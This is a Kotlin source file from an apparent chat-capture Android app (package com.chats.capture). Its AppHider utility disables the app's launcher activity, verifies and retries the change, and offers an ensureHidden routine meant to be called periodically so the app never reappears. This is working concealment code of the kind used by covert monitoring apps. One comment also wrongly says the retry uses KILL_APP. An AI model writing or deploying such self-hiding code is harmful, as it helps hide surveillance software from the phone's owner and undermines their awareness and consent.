package com.chats.capture.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import timber.log.Timber

/**
 * Utility to completely hide the app from launcher and ensure it stays hidden
 */
object AppHider {
    
    private const val LAUNCHER_ACTIVITY_CLASS = "com.chats.capture.ui.SettingsLauncherActivity"
    
    /**
     * Hide app from launcher completely
     */
    fun hide(context: Context) {
        try {
            // Verify app is installed
            try {
                context.packageManager.getPackageInfo(context.packageName, 0)
            } catch (e: Exception) {
                Timber.w("Package not found, cannot hide from launcher")
                return
            }
            
            // Use package name explicitly to avoid issues
            val componentName = ComponentName(context.packageName, LAUNCHER_ACTIVITY_CLASS)
            val packageManager = context.packageManager
            
            // Check current state before changing
            val currentState = packageManager.getComponentEnabledSetting(componentName)
            Timber.d("Current component state: $currentState")
            
            if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                Timber.d("App already hidden from launcher")
                return
            }
            
            // Disable the launcher activity - try multiple times to ensure it works
            // First attempt
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Wait a bit and verify
            Thread.sleep(100)
            
            // Verify the change took effect
            var newState = packageManager.getComponentEnabledSetting(componentName)
            if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                Timber.d("App successfully hidden from launcher (verified)")
            } else {
                Timber.w("First attempt failed - state is: $newState, retrying...")
                
                // Retry with KILL_APP flag if first attempt didn't work
                try {
                    packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP // Still use DONT_KILL_APP
                    )
                    
                    Thread.sleep(100)
                    newState = packageManager.getComponentEnabledSetting(componentName)
                    
                    if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                        Timber.d("App successfully hidden from launcher (retry successful)")
                    } else {
                        Timber.w("Retry also failed - state is: $newState")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error in retry hide attempt")
                }
            }
        } catch (e: SecurityException) {
            Timber.w(e, "Security exception hiding app - may need system permissions")
        } catch (e: Exception) {
            Timber.e(e, "Error hiding app from launcher: ${e.message}")
        }
    }
    
    /**
     * Check if app is hidden from launcher
     */
    fun isHidden(context: Context): Boolean {
        return try {
            val componentName = ComponentName(context, LAUNCHER_ACTIVITY_CLASS)
            val state = context.packageManager.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Timber.e(e, "Error checking if app is hidden")
            false
        }
    }
    
    /**
     * Ensure app stays hidden (call this periodically)
     */
    fun ensureHidden(context: Context) {
        if (!isHidden(context)) {
            hide(context)
        }
    }
}
